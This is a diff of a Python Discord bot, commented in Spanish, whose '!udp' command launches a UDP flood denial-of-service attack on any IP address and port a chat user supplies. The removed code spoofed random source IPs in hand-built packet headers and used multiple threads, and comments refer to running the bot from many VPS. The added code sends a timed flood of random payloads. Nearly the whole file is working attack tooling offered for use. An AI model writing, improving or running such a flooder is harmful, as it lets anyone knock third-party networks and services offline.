@@ -1,152 +1,94 @@
 import discord
 from discord.ext import commands
+import asyncio
 import socket
 import random
-import threading
-import time
-import os
 
 # Nombre del archivo para guardar el token
 TOKEN_FILE = "token.txt"
 
-# --- Funciones para el UDP Flood ---
+# Función para leer el token desde el archivo
+def leer_token():
+    try:
+        with open(TOKEN_FILE, "r") as f:
+            return f.read().strip()
+    except FileNotFoundError:
+        return None
 
-def generar_datos(longitud=1024):
-    """Genera datos aleatorios para enviar en el paquete UDP."""
-    return os.urandom(longitud)
+# Función para guardar el token en el archivo
+def guardar_token(token):
+    with open(TOKEN_FILE, "w") as f:
+        f.write(token)
 
-def generar_cabeceras():
-    """Genera cabeceras IP y UDP aleatorias."""
-    ip_header = bytearray([
-        0x45,  # Version and IHL
-        0x00,  # DSCP and ECN
-        0x00, 0x54,  # Total Length (ajustar luego)
-        0x00, 0x00,  # Identification
-        0x40, 0x00,  # Flags and Fragment Offset
-        0x40,  # TTL
-        0x11,  # Protocol (UDP)
-        0x00, 0x00,  # Header Checksum (ajustar luego)
-        random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255),  # Source IP (falsa)
-        random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255)   # Destination IP (se reemplaza luego)
-    ])
+# Obtener el token (primero intentar leerlo del archivo)
+token = leer_token()
 
-    udp_header = bytearray([
-        random.randint(1024, 65535) >> 8, random.randint(1024, 65535) & 0xFF, # Source Port (aleatorio)
-        0x00, 0x00,  # Destination Port (se reemplaza luego)
-        0x00, 0x36,  # Length (ajustar luego)
-        0x00, 0x00   # Checksum
-    ])
-    return ip_header, udp_header
+# Si no hay token en el archivo, pedirlo al usuario
+if not token:
+    token = input("Por favor, introduce el token de tu bot de Discord: ")
+    guardar_token(token)
+    print(f"Token guardado en {TOKEN_FILE}")
 
-def udp_flood(ip, port, tiempo, num_threads):
-    """Realiza el ataque UDP Flood."""
-    def enviar_paquetes():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            while time.time() - start_time < tiempo:
-                ip_header, udp_header = generar_cabeceras()
-                data = generar_datos() # Ya genera datos de 1024 bytes
-
-                # Reemplazar IP de destino en la cabecera IP
-                dest_ip_bytes = bytes(map(int, ip.split('.')))
-                ip_header[16:20] = dest_ip_bytes
-
-                # Reemplazar Puerto de destino en la cabecera UDP
-                udp_header[2:4] = port.to_bytes(2, 'big')
-
-                # Ajustar Longitud Total en cabecera IP
-                longitud_total = len(ip_header) + len(udp_header) + len(data)
-                ip_header[2:4] = longitud_total.to_bytes(2, 'big')
-
-                # Ajustar Longitud en cabecera UDP
-                udp_header[4:6] = (8 + len(data)).to_bytes(2, 'big') #8 bytes cabecera UDP
-
-                # Enviar el paquete
-                paquete_completo = bytes(ip_header) + bytes(udp_header) + data
-                sock.sendto(paquete_completo, (ip, port))
-        except Exception as e:
-            print(f"Error en thread: {e}")  # Debugging
-        finally:
-            sock.close()
-
-    start_time = time.time()
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=enviar_paquetes)
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
-    print("Ataque UDP Flood completado.")
-
-# --- Configuración del Bot de Discord ---
-
+# Configuración del bot
 intents = discord.Intents.default()
-intents.message_content = True  # Habilitar lectura de contenido de mensajes
-
+intents.message_content = True  # Necesario para leer el contenido de los mensajes
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# --- Eventos del Bot ---
+async def udp_flood(ip, port, time):
+    """Realiza un ataque UDP Flood."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent = 0
+    min_payload = 570
+    max_payload = 1250
+
+    start_time = asyncio.get_event_loop().time()
+    while (asyncio.get_event_loop().time() - start_time) < time:
+        # Generar un tamaño de payload aleatorio
+        payload_size = random.randint(min_payload, max_payload)
+        bytes = random._urandom(payload_size)  # Tamaño del payload aleatorio
+        try:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+        except Exception as e:
+            print(f"Error al enviar paquete: {e}")  # Imprime el error, importante para debug
+        await asyncio.sleep(0.001) # Espera 1 milisegundo (aprox. 1000 pps, pero no garantizado)
+
+    return sent
 
 @bot.event
 async def on_ready():
     print(f"Bot conectado como {bot.user.name}")
 
-# --- Comandos del Bot ---
-
 @bot.command()
-async def udp(ctx, ip=None, port=None, tiempo=None):
-    """Realiza un ataque UDP Flood a la IP y puerto especificados."""
-    if ip is None or port is None or tiempo is None:
-        await ctx.send("Faltan parámetros.  Uso: `!udp <IP> <Puerto> <Tiempo>`")
+async def udp(ctx, ip=None, port: int = None, time: int = None):
+    """Comando para realizar un ataque UDP Flood."""
+    if not all([ip, port, time]):
+        await ctx.send("Faltan parámetros.  Uso: `!udp <ip> <puerto> <tiempo en segundos>`")
         return
 
     try:
-        ip = str(ip)
-        port = int(port)
-        tiempo = int(tiempo)
-    except ValueError:
-        await ctx.send("Puerto y Tiempo deben ser números enteros.")
+        #Validación de IP
+        socket.inet_aton(ip) #Convierte la IP a formato binario
+    except socket.error:
+        await ctx.send("La IP proporcionada no es válida.")
         return
-
-    if not (0 < port < 65536):
+    
+    # Validación de puerto
+    if not (1 <= port <= 65535):
         await ctx.send("El puerto debe estar entre 1 y 65535.")
         return
+    
+    # Validación del tiempo
+    if time <= 0:
+         await ctx.send("El tiempo debe ser mayor a cero.")
+         return
 
-    if tiempo <= 0:
-        await ctx.send("El tiempo debe ser mayor que cero.")
-        return
-
-    await ctx.send(f"Iniciando ataque UDP Flood a {ip}:{port} durante {tiempo} segundos...")
-    # Número de threads.  Aumentar puede saturar la API si el bot está en muchas VPS.
-    num_threads = 10
-    threading.Thread(target=udp_flood, args=(ip, port, tiempo, num_threads)).start()
-    await ctx.send("Ataque iniciado en segundo plano.")
-
-# --- Obtener Token ---
-
-def obtener_token():
-    """Obtiene el token de Discord del archivo o lo solicita al usuario."""
-    if os.path.exists(TOKEN_FILE):
-        with open(TOKEN_FILE, "r") as f:
-            token = f.read().strip()
-            return token
-    else:
-        token = input("Ingrese el token de su bot de Discord: ")
-        with open(TOKEN_FILE, "w") as f:
-            f.write(token)
-        return token
-
-# --- Ejecución del Bot ---
-
-if __name__ == "__main__":
-    token = obtener_token()
+    await ctx.send(f"Iniciando ataque UDP Flood a {ip}:{port} durante {time} segundos...")
     try:
-        bot.run(token)
-    except discord.errors.LoginFailure:
-        print("Error: Token inválido.  Verifique el token en token.txt o borre el archivo para ingresarlo nuevamente.")
-    except discord.errors.HTTPException as e:
-        print(f"Error de conexión a Discord: {e}")
-        print("Esto podría deberse a demasiadas conexiones desde múltiples VPS.")
-        print("Considere usar menos VPS o un retraso mayor entre conexiones.")
+        sent_packets = await udp_flood(ip, port, time)
+        await ctx.send(f"Ataque UDP Flood a {ip}:{port} finalizado.  Se enviaron aproximadamente {sent_packets} paquetes.") # Ajusta el mensaje final
+    except Exception as e:
+        await ctx.send(f"Ocurrió un error durante el ataque: {e}") # Manejo de errores más robusto
+
+# Iniciar el bot
+bot.run(token)
